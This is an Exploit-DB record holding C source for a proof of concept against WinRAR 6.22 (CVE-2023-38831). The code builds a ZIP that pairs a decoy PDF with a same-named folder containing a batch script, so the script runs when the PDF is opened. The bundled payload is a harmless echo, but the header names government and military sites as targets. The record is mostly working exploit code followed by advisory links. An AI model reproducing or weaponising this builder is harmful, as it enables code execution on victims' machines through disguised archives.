{"source": "https://www.exploit-db.com/exploits/51935", "vulnName": "WinRAR version 6.22 - Remote Code Execution via ZIP archive", "vulnEDBID": "51935", "vulnCVE": "N/A", "author": "E1 CODERS", "exploitType": "REMOTE", "platform": "WINDOWS", "datePublished": "2024-03-28", "vulnContent": "################################################################################################\n# Exploit Title :  EXPLOIT WinRAR version 6.22 Vulnerability CVE-2023-38831 #\n# #\n# Author : E1.Coders #\n# #\n# Contact : E1.Coders [at] Mail [dot] RU #\n# #\n# Security Risk : High #\n# #\n# Description : All target's GOV & Military websites #\n# #\n################################################################################################\n# #\n# Expl0iTs: #\n \n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include \"zip.h\"\n#define PDF_FILE \"document.pdf\"\n#define FOLDER_NAME \"document.pdf\\\\\"\n#define SCRIPT_FILE \"script.bat\"\n#define ZIP_FILE \"exploit.zip\"\n \nint main(void) {\n    zipFile zf = zipOpen(ZIP_FILE, APPEND_STATUS_CREATE);\n    if (zf == NULL) {\n        printf(\"Error opening ZIP file\\n\");\n        return -1;\n    }\n    zip_fileinfo zfi;\n    memset(&zfi, 0, sizeof(zfi));\n    if (zipOpenNewFileInZip(zf, PDF_FILE, &zfi, NULL, 0, NULL, 0, NULL, Z_DEFLATED, Z_DEFAULT_COMPRESSION) != ZIP_OK) {\n        printf(\"Error adding PDF file to ZIP file\\n\");\n        zipClose(zf, NULL);\n        return -1;\n    }\n    FILE *fp = fopen(PDF_FILE, \"rb\");\n    if (fp == NULL) {\n        printf(\"Error opening PDF file\\n\");\n        zipCloseFileInZip(zf);\n        zipClose(zf, NULL);\n        return -1;\n    }\n    char buffer[1024];\n    int bytes_read;\n    while ((bytes_read = fread(buffer, 1, sizeof(buffer), fp)) > 0) {\n        if (zipWriteInFileInZip(zf, buffer, bytes_read) < 0) {\n            printf(\"Error writing PDF file to ZIP file\\n\");\n            fclose(fp);\n            zipCloseFileInZip(zf);\n            zipClose(zf, NULL);\n            return -1;\n        }\n    }\n    fclose(fp);\n    zipCloseFileInZip(zf);\n    if (zipOpenNewFileInZip(zf, FOLDER_NAME, &zfi, NULL, 0, NULL, 0, NULL, Z_DEFLATED, Z_DEFAULT_COMPRESSION) != ZIP_OK) {\n        printf(\"Error adding folder to ZIP file\\n\");\n        zipClose(zf, NULL);\n        return -1;\n    }\n    zipCloseFileInZip(zf);\n    char script_name[256];\n    sprintf(script_name, \"%s%s\", FOLDER_NAME, SCRIPT_FILE);\n    if (zipOpenNewFileInZip(zf, script_name, &zfi, NULL, 0, NULL, 0, NULL, Z_DEFLATED, Z_DEFAULT_COMPRESSION) != ZIP_OK) {\n        printf(\"Error adding script file to ZIP file\\n\");\n        zipClose(zf, NULL);\n        return -1;\n    }\n    char script_content[] = \"@echo off\\nstart cmd /c \\\"echo You have been exploited by CVE-2023-38831 && pause\\\"\\n\";\n    if (zipWriteInFileInZip(zf, script_content, strlen(script_content)) < 0) {\n        printf(\"Error writing script file to ZIP file\\n\");\n        zipCloseFileInZip(zf);\n        zipClose(zf, NULL);\n        return -1;\n    }\n    zipCloseFileInZip(zf);\n \n    zipClose(zf, NULL);\n \n    printf(\"ZIP file created successfully\\n\");\n    return 0;\n}\n\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-38831\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-38831\nhttps://github.com/HDCE-inc/CVE-2023-38831\nhttps://www.cvedetails.com/cve/CVE-2023-38831/\nhttps://www.logpoint.com/en/blog/emerging-threats/cve-2023-38831-winrar-decompression-or-arbitrary-code-execution/\nhttps://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Exploit:Win32/CVE-2023-38831\nhttp://packetstormsecurity.com/files/174573/WinRAR-Remote-Code-Execution.html\nhttps://blog.google/threat-analysis-group/government-backed-actors-exploiting-winrar-vulnerability/\nhttps://news.ycombinator.com/item?id=37236100\nhttps://www.bleepingcomputer.com/news/security/winrar-zero-day-exploited-since-april-to-hack-trading-accounts/\nhttps://www.group-ib.com/blog/cve-2023-38831-winrar-zero-day/\nhttps://hdce.medium.com/cve-2023-38831-winrar-zero-day-poses-new-risks-for-traders-684911befad2\n \n            "}